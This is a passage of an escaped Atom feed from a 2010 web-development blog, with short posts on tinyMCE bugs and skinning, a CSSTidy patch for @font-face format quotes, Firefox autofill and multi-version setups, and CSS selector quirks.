    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you&amp;#39;re not familiar with the complex tinyMCE syntax this may seems a
little... well... complex.Â  I&amp;#39;ll focus on the error line but I wanted to paste
the whole code block so you can see my point.&lt;/p&gt;

&lt;p&gt;The error line is this one :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;nx&quot;&gt;ed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;overflow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getParam&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;fullscreen_html_overflow&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Of course it will throw an error, we try to access a property of an element we
just removed from the DOM (two lines before : &lt;code&gt;tinyMCE.remove(ed);&lt;/code&gt;). Why
would someone want to do that ?&lt;/p&gt;

&lt;p&gt;Well in fact, this is not &lt;code&gt;ed&lt;/code&gt; (that we should try to access, but &lt;code&gt;de&lt;/code&gt; (short
for &lt;code&gt;DOM.doc.documentElement&lt;/code&gt;). In fact the code was correct in 3.3.2, but
someone changed it around 3.3.3.&lt;/p&gt;

&lt;p&gt;My guess is that someone had the file opened, saw this bit of code, spotted
the &lt;code&gt;de&lt;/code&gt;, and seeing a lot of references to &lt;code&gt;ed&lt;/code&gt; all around, thought it was a
typo and &amp;#39;fixed&amp;#39; it.&lt;/p&gt;

&lt;p&gt;Reading the tinyMCE code (whenever you want to understand how it works, or
want to study plugins before creating your own) is pretty hard. There are
almost no comments, and variable names are only one or two letters long.&lt;/p&gt;

&lt;p&gt;The tinyMCE team released a survey asking user what should be improved on the
tinyMCE product. I answered it, and my main point was to improve
documentation, because reading the tinyMCE core to understand its inner goings
is quite a chore.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>@font-face with multiple fonts and CSSTidy</title>
   <link href="http://blog.pixelastic.com/2010/05/07/csstidy-and-the-woff-fonts/"/>
   <updated>2010-05-07T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/05/07/csstidy-and-the-woff-fonts</id>
   <content type="html">&lt;p&gt;The &lt;code&gt;.woff&lt;/code&gt; font extension is the standard-to-go in terms of font embedding on
the web.&lt;/p&gt;

&lt;p&gt;You should add them first in the order of fonts you&amp;#39;re loading, before the
&lt;code&gt;.ttf&lt;/code&gt;/&lt;code&gt;.otf&lt;/code&gt; ones.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;k&quot;&gt;@font-face&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Unibody8SmallCaps Regular&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;fonts/unibody_8-smallcaps-webfont.woff&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;woff&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;fonts/unibody_8-smallcaps-webfont.ttf&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;truetype&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The interesting thing to note is that you cannot omit the quotes around the
&lt;code&gt;format(&amp;#39;woff&amp;#39;)&lt;/code&gt;/&lt;code&gt;format(&amp;#39;truetype&amp;#39;)&lt;/code&gt; part. Otherwise the font won&amp;#39;t be
recognized (at least by FF3.6).&lt;/p&gt;

&lt;p&gt;CSSTidy seems to have a bug when there are multiple &lt;code&gt;format()&lt;/code&gt;declarations in
a rule, it removes quotes in each of them except the last one, thus making the
whole rule unparsable by the browser.&lt;/p&gt;

&lt;p&gt;So I started, again, to dig into the CSSTidy code and see what I could do
about that.&lt;/p&gt;

&lt;p&gt;I updated the &lt;code&gt;csstidy.php&lt;/code&gt; file at around line 847 and changed the &lt;code&gt;if&lt;/code&gt;
statement to look like this :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;if($this-&amp;gt;sub_value != &amp;#39;&amp;#39;) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $this-&amp;gt;sub_value_arr[] = $this-&amp;gt;sub_value;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  foreach($this-&amp;gt;sub_value_arr as &amp;amp;$sub_value) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    if (substr($sub_value, 0, 6) == &amp;#39;format&amp;#39;) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      $sub_value = str_replace(array(&amp;#39;format(&amp;#39;, &amp;#39;)&amp;#39;), array(&amp;#39;format(&amp;quot;&amp;#39;, &amp;#39;&amp;quot;)&amp;#39;), $sub_value);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $this-&amp;gt;sub_value = &amp;#39;&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This way all sub values of the &lt;code&gt;src:&lt;/code&gt; rule will be correctly parsed, and not
only the last one.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Preventing Firefox from auto-filling login and password fields</title>
   <link href="http://blog.pixelastic.com/2010/05/05/preventing-firefox-from-auto-filling-login-and-password-fields/"/>
   <updated>2010-05-05T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/05/05/preventing-firefox-from-auto-filling-login-and-password-fields</id>
   <content type="html">&lt;p&gt;When you login in an app and tell Firefox to remember your password, it will
then automatically fill any password field that have a login field near it.&lt;/p&gt;

&lt;p&gt;It can be quite embarassing when you are developping an admin panel where you
can edit your own profile informations. The password field will be filled
every time you go to that page, even if you explicitly set no value.&lt;/p&gt;

&lt;p&gt;The way to circumvent this is to add an &lt;code&gt;autocomplete=&amp;quot;off&amp;quot;&lt;/code&gt; attribute to the
field.&lt;/p&gt;

&lt;p&gt;It may not validate, but is understood both by IE and FF AFAIK.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>You should always test on older browser versions</title>
   <link href="http://blog.pixelastic.com/2010/05/04/you-should-always-test-on-older-browser-versions/"/>
   <updated>2010-05-04T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/05/04/you-should-always-test-on-older-browser-versions</id>
   <content type="html">&lt;p&gt;You probably already have installed on your computer various web browsers (FF,
IE, Safari, Opera and Chrome) to test your websites. You most certainly also
have multiple installs of IE (or are using IETester) because the underlying
engine of those browser is very different from one version to another.&lt;/p&gt;

&lt;p&gt;Firefox, Safari, Opera and Chrome users are more educated to the &amp;quot;always
update to latest version&amp;quot; paradygm so you rarely have to debug old and obscure
versionÂ of those browsers.&lt;/p&gt;

&lt;p&gt;At least it was what I thought until I was stucked with an old 3.0 version of
Firefox on my laptop (mostly due to my inability to upgrade to the latest
version. I&amp;#39;m stillÂ new to the linux world and my laptop is running ubuntu).
Anyway, it made me understand that even if you are willing to upgrade you
can&amp;#39;t always do it and oldÂ browser versions should be supported too.&lt;/p&gt;

&lt;p&gt;In a recent CSS experiment, I managed to style checkboxes and radio buttons in
pure CSS. Unfortunatly, because I was using some &amp;quot;advanced&amp;quot; CSS selectors,
FF3.0 wasn&amp;#39;tÂ able to render it correctly, in fact it was able to render only
half the rules, making the whole thing totally unusable.&lt;/p&gt;

&lt;p&gt;That was a perfect example of an old browser I had to debug. I will not dive
into the details of the CSS (mostly because I haven&amp;#39;t fixed it completly),Â and
this post was only to remind you (and me) to always check on previous browser
versions.&lt;/p&gt;

&lt;p&gt;Next post will be explaining how to test on multiple Firefox versions side by
side.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Using :after and :before</title>
   <link href="http://blog.pixelastic.com/2010/05/04/using-after-and-before/"/>
   <updated>2010-05-04T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/05/04/using-after-and-before</id>
   <content type="html">&lt;p&gt;&lt;code&gt;:after&lt;/code&gt; and &lt;code&gt;:before&lt;/code&gt;pseudo-elements allow one to add generated content
before or after an other element. It can be used to add quotes around text,
icons after a link to specify the language of the target page and a lot of
other useful stuff like that.&lt;/p&gt;

&lt;p&gt;It can also be mastered to create more powerful styling. I&amp;#39;ll post more about
that later.&lt;/p&gt;

&lt;p&gt;Anyway, IE6 and IE7 don&amp;#39;t support it. Firefox is supposed to support it from
the 3.0 version but in fact it is still buggy in this release.&lt;/p&gt;

&lt;p&gt;Pseudo-elements must be inline elements and can&amp;#39;t be absolutly positionned in
FF3.0, thus greatly reducing the number of fun things we could do with them in
this browser.&lt;/p&gt;

&lt;p&gt;It faced me with a challenge. If I wrote &lt;code&gt;:before&lt;/code&gt; and &lt;code&gt;:after&lt;/code&gt; rules, they
would be only understood by FF3.0 but badly rendered, resulting in half the
styling I expected.&lt;/p&gt;

&lt;p&gt;Browsers that don&amp;#39;t understand the rules would not apply them and keep the
default rendering, compliant browsers will render all the rules, but the grey
area in between is filled with FF3.0 that will think it can handle them and
will finally badly render them.&lt;/p&gt;

&lt;p&gt;I haven&amp;#39;t found a way to specificaly target FF3.0, so I used an alternate
method.&lt;/p&gt;

&lt;p&gt;All the browsers that understand the &lt;code&gt;:only-of-type&lt;/code&gt; selector also understand
&lt;code&gt;:before&lt;/code&gt;/&lt;code&gt;:after&lt;/code&gt;. But FF3.0 and IE7 do not understand &lt;code&gt;:only-of-type&lt;/code&gt;. So if
I wrote a rule starting with &lt;code&gt;body:only-of-type&lt;/code&gt;, it will only be applied to
browsers with complete &lt;code&gt;:after&lt;/code&gt; and &lt;code&gt;:before&lt;/code&gt;support (excluding FF3.0). This
solved my problem.&lt;/p&gt;

&lt;p&gt;Unfortunatly, it will also filter out IE7 who does not understand &lt;code&gt;:only-of-
type&lt;/code&gt; but does understand &lt;code&gt;:after&lt;/code&gt;/&lt;code&gt;:before&lt;/code&gt;. I usually remove all fancy form
styling for IE anyway so that&amp;#39;s not a big deal for me, but if you really care,
you just have to override the rule in a IE7 specific stylesheet.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Running multiple Firefox versions side by side on Windows</title>
   <link href="http://blog.pixelastic.com/2010/05/04/running-multiple-firefox-versions-side-by-side-on-windows/"/>
   <updated>2010-05-04T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/05/04/running-multiple-firefox-versions-side-by-side-on-windows</id>
   <content type="html">&lt;p&gt;Whenever you upgrade your Firefox, the new version will overwrite the previous
one. If you want to open multiple Firefox versions side by side, here&amp;#39;s my way
:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;First, uninstall all your previous Firefox installation(s). Make sure to backup any important data beforehand (I personnaly use MozBackup to do that).&lt;/li&gt;
&lt;li&gt;Then install the latest available stable version. This will be the main Firefox version, the one you&amp;#39;ll be using on your dayjob and the one you&amp;#39;ll always update.&lt;/li&gt;
&lt;li&gt;Now run the Firefox ProfileManager.
To do that, create a shortcut to your &lt;code&gt;firefox.exe&lt;/code&gt; file, then edit this
shortcut. In the &amp;quot;Target&amp;quot; field, add &lt;code&gt;-Profilemanager&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;My field looks like : &lt;code&gt;&amp;quot;C:\Program Files\Internet\Firefox\firefox.exe&amp;quot;
-Profilemanager&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;You now have to create one new profile for each FF version you plan on testing. Give them meaningful names. I named mine &amp;quot;FF3.0&amp;quot;.&lt;/li&gt;
&lt;li&gt;Now download the corresponding Firefox version from &lt;a href=&quot;http://www.oldversion.com/Mozilla-Firefox.html&quot;&gt;oldversion.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Do not install it, but extract its content (using a archiving tool like winrar or 7-zip) in a tmp directory. Remove the &lt;code&gt;optional&lt;/code&gt;directory as well as &lt;code&gt;removed-files.log&lt;/code&gt; and &lt;code&gt;setup.exe&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Copy the content of &lt;code&gt;localized/&lt;/code&gt; into &lt;code&gt;nonlocalized/&lt;/code&gt; (overwrite files if asked).&lt;/li&gt;
&lt;li&gt;&lt;p&gt;You can now rename the &lt;code&gt;nonlocalized/&lt;/code&gt; directory and move it around on your hard drive.
I renamed mine to &lt;code&gt;Firefox 3.0/&lt;/code&gt; and put it alongside the main Firefox, in
&lt;code&gt;C:\Program Files\Internet\Firefox 3.0\&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Create a shortcut to the &lt;code&gt;firefox.exe&lt;/code&gt; file in this directory and edit the target field.
This time, we have to specify which profile to use. Just add &lt;code&gt;-P &amp;quot;FF3.0&amp;quot; -no-
remote&lt;/code&gt; in the target field.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Mine now looks like &lt;code&gt;C:\Program Files\Internet\Firefox 3.0\firefox.exe&amp;quot; -P
&amp;quot;FF3.0&amp;quot; -no-remote&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;That&amp;#39;s it.&lt;/p&gt;

&lt;p&gt;Now, just run your classic Firefox shortcut to open the most up to date
Firefox version, and use the custom shortcuts to open previous versions.&lt;/p&gt;

&lt;p&gt;I personnaly also rename the different &lt;code&gt;firefox.exe&lt;/code&gt; to &lt;code&gt;firefox30.exe&lt;/code&gt;, or
&lt;code&gt;firefox35.exe&lt;/code&gt; to more easily spot them in the taskmanager.&lt;/p&gt;

&lt;p&gt;I also edit each &lt;code&gt;.exe&lt;/code&gt; with ResHack to change their taskbar icons. I haven&amp;#39;t
yet managed to change their title.&lt;/p&gt;

&lt;p&gt;Edit : Now I can&amp;#39;t open .html files directly from the explorer nor follow
links from my IM. I still don&amp;#39;t know exactly what of the steps above caused
that.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Changing Firefox language</title>
   <link href="http://blog.pixelastic.com/2010/05/04/changing-firefox-languages/"/>
   <updated>2010-05-04T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/05/04/changing-firefox-languages</id>
   <content type="html">&lt;p&gt;I&amp;#39;m French, live in France, but usually prefer having my software in English.&lt;/p&gt;

&lt;p&gt;This is so because english words are generally shorter (and thus fits more
easily in a GUI) and most of the time french translations aren&amp;#39;t optimal.&lt;/p&gt;

&lt;p&gt;I just download the latest Firefox version from their website, and without
knowing it, it was a French localized one. They do some sniffing on the user
agent string and automatically download the corresponding file.&lt;/p&gt;

&lt;p&gt;That seems a great idea, but I prefer my software in english, so I searched
for a &lt;code&gt;en-US.xpi&lt;/code&gt; file to update firefox. It does exists for any other
language, but not for &lt;code&gt;en-US&lt;/code&gt;, this being the default language, as stated in
&lt;a href=&quot;https://bugzilla.mozilla.org/show_bug.cgi?id=485860&quot;&gt;this bug report&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;It seems the only way to have an english Firefox is to download the english
version, there is no way to change it afterwards.&lt;/p&gt;

&lt;p&gt;You can type &lt;code&gt;about:config&lt;/code&gt; and change the &lt;code&gt;general.useragent.locale&lt;/code&gt; value to
&lt;code&gt;en-US&lt;/code&gt; but it does not update the main language, only tell plugins to use
that language (AFAIK).&lt;/p&gt;

&lt;p&gt;Changing the language in the options only change the user agent string.&lt;/p&gt;

&lt;p&gt;Well, I had to backup my profiles, uninstall FF, download the english version
and reinstall it.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>How to select the first element of a given class</title>
   <link href="http://blog.pixelastic.com/2010/04/20/how-to-select-the-first-element-of-a-given-class/"/>
   <updated>2010-04-20T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/04/20/how-to-select-the-first-element-of-a-given-class</id>
   <content type="html">&lt;p&gt;Imagine the following HTML code :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;wrapper&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
[... various HTML elements ...]
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;bar&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;foo&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;bar&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;bar&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;foo&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;How would one style the first &lt;code&gt;div.foo&lt;/code&gt; ?&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve tried &lt;code&gt;div.wrapper div.foo:first-of-type&lt;/code&gt; but unfortunatly it does not
work. In fact the previous rule can be translated into &amp;quot;select the first child
of div.wrapper only if it is a div.foo&amp;quot; and not &amp;quot;select the first div.foo
inside div.wrapper&amp;quot; as I imagined.&lt;/p&gt;

&lt;p&gt;Using jQuery I could do a &lt;code&gt;$(&amp;#39;div.wrapper div.foo:first&amp;#39;)&lt;/code&gt; but there&amp;#39;s no such
selector in CSS.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>The blockquote cite attribute</title>
   <link href="http://blog.pixelastic.com/2010/04/19/the-blockquote-cite-attribute/"/>
   <updated>2010-04-19T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/04/19/the-blockquote-cite-attribute</id>
   <content type="html">&lt;p&gt;The HTML blockquote element can accept a cite attribute that is supposed to
hold the value of the source URI of the quote.&lt;/p&gt;

&lt;p&gt;Browsers behave differently when getting this attribute in javascript. Opera
and Firefox automatically treat it as a URL, prepending the current domain
host if none is defined and encoding special characters.&lt;/p&gt;

&lt;p&gt;Safari and Chrome on the other end just return the value as it is present in
the HTML.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Setting the size of a tab character in a pre element</title>
   <link href="http://blog.pixelastic.com/2010/04/19/setting-the-size-of-a-tab-character-in-a-element/"/>
   <updated>2010-04-19T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/04/19/setting-the-size-of-a-tab-character-in-a-element</id>
   <content type="html">&lt;p&gt;When displaying code in an HTML page, you often want it to be correctly
indented with tabs. Unfortunatly, setting a &lt;code&gt;white-space:pre&lt;/code&gt;(like is the
default on a &lt;pre&gt; element) to an element will transform any tab in the
equivalent of 8 space characters.&lt;/p&gt;

&lt;p&gt;8 is way more than needed, 4 will be much suited, specially in a website
design where the horizontal space is limited.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve googled a lot, going from obscure old CSS drafts to proprietary
implementation mailing lists, browsing CSS codes.&lt;/p&gt;

&lt;p&gt;One &lt;a href=&quot;http://www.phwinfo.com/forum%0A/comp-inf-authoring-css/365851-change-tab-width-using-css.html&quot;&gt;interesting discussion can be found here&lt;/a&gt;, there even is
a &lt;a href=&quot;http://www.w3.org/People/howcome/t%0A/970224HTMLERB-CSS/WD-tabs-970117.html&quot;&gt;proposal for a tab-stops property&lt;/a&gt; on the W3C&lt;/p&gt;

&lt;p&gt;Opera has a proprietary &lt;code&gt;-o-tab-size&lt;/code&gt;. You just have to pass the number of
space characters that should be used.&lt;/p&gt;

&lt;p&gt;That&amp;#39;s all I have for now...&lt;/p&gt;

&lt;p&gt;I know I could replace every&lt;code&gt;\t&lt;/code&gt; with 4 &lt;code&gt;&amp;amp;nbsp;&lt;/code&gt;, or with a &lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt; that
I&amp;#39;ll style to match the desired width but it involves a back-end processing
and I would have liked to style it directly.&lt;/p&gt;

&lt;p&gt;Edit : There seems to have a &lt;code&gt;-moz-tab-size&lt;/code&gt; property on the latest Firefox
3.7 nightlies&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Tweaking tinyMCE</title>
   <link href="http://blog.pixelastic.com/2010/04/13/tweaking-tinymce/"/>
   <updated>2010-04-13T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/04/13/tweaking-tinymce</id>
   <content type="html">&lt;p&gt;I&amp;#39;m in the process of tweaking a tinyMCE install to use a custom set of
plugins and a custom skin to better fit in the Caracole CMS. This would allow
me to re-use CSS and JS code I&amp;#39;ve already coded.&lt;/p&gt;

&lt;p&gt;Fortunatly, I&amp;#39;m getting better and better at understanding the way tinyMCE
works and the various configuration options and how to tweak them.&lt;/p&gt;

&lt;p&gt;I also want the tinyMCE CSS rules to be integrated into the main CSS file of
my app (packed and minified using CSSTidy). So I defined a custom skin in the
tinyMCE setup, named &amp;#39;&lt;code&gt;caracole&lt;/code&gt;&amp;#39;. This way, all the CSS skinning classes will
be prefixed with &lt;code&gt;caracole&lt;/code&gt;as I don&amp;#39;t want to mess with the default skins.&lt;/p&gt;

&lt;p&gt;I also copied the &lt;code&gt;ui.css&lt;/code&gt; file from the &lt;code&gt;themes/advanced/skins/default&lt;/code&gt; to my
own css directory, renamed it to &lt;code&gt;tinymce.css&lt;/code&gt;, replaced all &lt;code&gt;.default&lt;/code&gt;
occurences to &lt;code&gt;.caracole&lt;/code&gt; and added this file to the list of files being
processed by the main packer.&lt;/p&gt;

&lt;p&gt;This way I can easily update any css file from the same directory, without
having to dive into the tinymce subdirectories.&lt;/p&gt;

&lt;p&gt;Unfortunatly, by doing so, tinyMCE continue to load the
&lt;code&gt;tiny_mce/themes/advanced/skins/caracole/ui.css&lt;/code&gt; file (have a look at Firebug
if you don&amp;#39;t trust me). It took me some time to figure out where that call was
made from. It is actually on &lt;code&gt;editor_template.js&lt;/code&gt; (around line 150 in dev
version).&lt;/p&gt;

&lt;p&gt;As I didn&amp;#39;t want to load this file twice, I tried to disable this call. I
could have manually patched the source file but I don&amp;#39;t want to, it would make
any future update a pain. So I tried to find an other way.&lt;/p&gt;

&lt;p&gt;Looking at the &lt;code&gt;loadCSS&lt;/code&gt;method, it appears that there is a mechanism to
prevent loading twice the same file. If the file is already present in the
&lt;code&gt;.files&lt;/code&gt; array, it won&amp;#39;t be added. Ok, so now I just have to manually add the
file before the call is made.&lt;/p&gt;

&lt;p&gt;That&amp;#39;s where the setup callback come into play. I just defined in my
inyMCE.init :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;nx&quot;&gt;tinyMCE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;skin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;caracole&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;editor_css&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;caracoleDoNotInclude&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;tinymce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DOM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;http://&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/caracoleDoNotInclude&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Doing so, the &lt;code&gt;loadCSS&lt;/code&gt;will try to load the &lt;code&gt;caracoleDoNotInclude&lt;/code&gt; file
(clearly this name is a placeholder, I have no such file). And in the setup
method I manually tell tinyMCE that this file is already loaded so when it
will initiate, it won&amp;#39;t load the file at all.&lt;/p&gt;

&lt;p&gt;Same goes for the &lt;code&gt;content_css&lt;/code&gt;, the file that handle the look and feel of the
editable zone. I don&amp;#39;t want to have my file in the tinyMCE skin directory, I&amp;#39;d
